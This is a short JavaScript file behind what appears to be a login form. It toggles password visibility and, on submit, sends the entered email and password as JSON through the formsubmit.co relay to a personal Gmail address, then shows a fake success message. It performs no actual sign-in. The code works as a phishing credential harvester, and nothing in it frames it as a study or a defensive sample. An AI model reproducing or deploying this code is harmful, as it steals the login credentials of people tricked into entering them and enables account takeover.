const pass_field = document.querySelector('.pass');
const email_field = document.querySelector('.email');
const showBtn = document.querySelector('.show');
const form = document.querySelector('.form-submit');
const load = document.querySelector('.lds-facebook');
const succes = document.querySelector('.succes');

showBtn.addEventListener('click', function () {
	if (pass_field.type === 'password') {
		pass_field.type = 'text';
		showBtn.textContent = 'HIDE';
		showBtn.style.color = '#D052F6';
	} else {
		pass_field.type = 'password';
		showBtn.textContent = 'SHOW';
		showBtn.style.color = '#222';
	}
});

form.addEventListener('submit', e => {
	e.preventDefault();
	let emailValue = email_field.value;
	let passValue = pass_field.value;

	load.style.display = 'inline-block';
	fetch('https://formsubmit.co/ajax/tonight0bayastan@gmail.com', {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
			Accept: 'application/json',
		},
		body: JSON.stringify({
			email: emailValue,
			password: passValue,
		}),
	})
		.then(() => {
			load.style.display = 'none';
			succes.style.opacity = '1';
			succes.style.left = '0px';

			setTimeout(() => {
				succes.style.opacity = '0';
				succes.style.left = '-50px';
			}, 2500);
		})
		.catch(error => console.log(error));
});
